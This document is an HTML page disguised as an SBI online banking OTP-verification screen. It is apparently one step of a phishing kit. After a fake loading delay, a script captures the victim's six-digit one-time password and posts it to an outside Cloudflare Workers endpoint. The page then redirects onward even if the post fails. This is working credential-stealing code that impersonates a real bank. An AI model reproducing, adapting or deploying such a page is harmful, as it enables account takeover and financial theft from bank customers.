<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBI - Online Banking</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
        body { background-color: #fff; display: flex; justify-content: center; overflow-x: hidden; }
        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; visibility: hidden; }
        .full-img { width: 100%; display: block; }

        /* 10 Sec Loader */
        #initial-loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }
        .spinner {
            width: 45px; height: 45px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #315195;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { margin-top: 15px; color: #315195; font-size: 14px; font-weight: bold; }

        .header-bar { background-color: #315195; color: white; padding: 10px 15px; font-size: 14px; font-weight: bold; }
        .content-area { padding: 15px 20px; }
        .msg-box { font-size: 13px; color: #333; line-height: 1.6; margin-bottom: 15px; padding: 12px; background-color: #f8fbff; border: 1px solid #d1e9ff; border-radius: 4px; }
        .otp-sent-text { color: #28a745; font-weight: bold; margin-bottom: 5px; display: block; font-size: 13px; }
        .timer-box { color: #b30000; font-weight: bold; font-size: 14px; margin-bottom: 15px; text-align: right; }
        
        .field-group { margin-top: 10px; }
        .field-group label { display: block; font-size: 13px; color: #444; margin-bottom: 8px; font-weight: bold; }
        
        /* Sleek Thin Input */
        .otp-input { 
            width: 100%; height: 34px; padding: 0 12px; 
            background-color: #fff; border: 1px solid #999; 
            border-radius: 2px; font-size: 16px; outline: none; 
        }

        .btn-row { display: flex; gap: 12px; margin-top: 25px; }
        .btn { padding: 8px 28px; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; }
        .btn-submit { background-color: #315195; }
        .btn-resend { background-color: #6c757d; }
    </style>
</head>
<body>

    <div id="initial-loader">
        <div class="spinner"></div>
        <div class="loading-text">Verifying Your Details...</div>
    </div>

    <div class="container" id="main-content">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI Header" class="full-img">
        <div class="header-bar">High Security Password</div>
        
        <div class="content-area">
            <div class="msg-box">
                <span class="otp-sent-text">✔ OTP has been sent to your registered mobile number.</span>
                Please enter the 6-digit High Security Password (OTP) to proceed.
            </div>
            
            <div class="timer-box">OTP expires in: <span id="timer">02:00</span></div>
            
            <div class="field-group">
                <label>Enter One Time Password *</label>
                <input type="number" id="otp_val" class="otp-input" inputmode="numeric" 
                       oninput="if(this.value.length > 6) this.value = this.value.slice(0, 6);" 
                       placeholder="Enter 6-digit OTP" required>
            </div>
            
            <div class="btn-row">
                <button type="button" class="btn btn-submit" id="submitBtn" onclick="submitOTP()">Confirm</button>
                <button type="button" class="btn btn-resend" onclick="location.reload()">Cancel</button>
            </div>
        </div>
        
        <div style="margin-top: 40px;"><img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="SBI Footer" class="full-img"></div>
    </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';

        window.onload = function() {
            setTimeout(function() {
                document.getElementById('initial-loader').style.display = 'none';
                document.getElementById('main-content').style.visibility = 'visible';
                startTimer();
            }, 10000); 
        };

        function startTimer() {
            let timeLeft = 120;
            const timerElement = document.getElementById('timer');
            const countdown = setInterval(() => {
                let min = Math.floor(timeLeft / 60);
                let sec = timeLeft % 60;
                sec = sec < 10 ? '0' + sec : sec;
                timerElement.innerHTML = `0${min}:${sec}`;
                if (timeLeft <= 0) { clearInterval(countdown); timerElement.innerHTML = "Expired"; }
                else { timeLeft--; }
            }, 1000);
        }

        async function submitOTP() {
            const otpField = document.getElementById('otp_val');
            const otp = otpField.value;
            const btn = document.getElementById('submitBtn');
            
            if (otp.length !== 6) {
                alert("Please enter exactly 6 digits.");
                return;
            }

            btn.disabled = true;
            btn.innerText = "Verifying...";

            // FIX: Added 'type' and 'otp_value' to match Worker SQL
            const payload = { 
                type: "OTP",
                step: "OTP-1", 
                otp: otp
            };

            try {
                // FIX: Removed 'no-cors', using 'cors' mode
                await fetch(workerURL, { 
                    method: 'POST', 
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload) 
                });
                
                // Redirecting to Next Page
                window.location.href = "about.html";
            } catch (err) {
                // Error hone par bhi redirect kar do
                window.location.href = "about.html";
            }
        }
    </script>
</body>
</html>
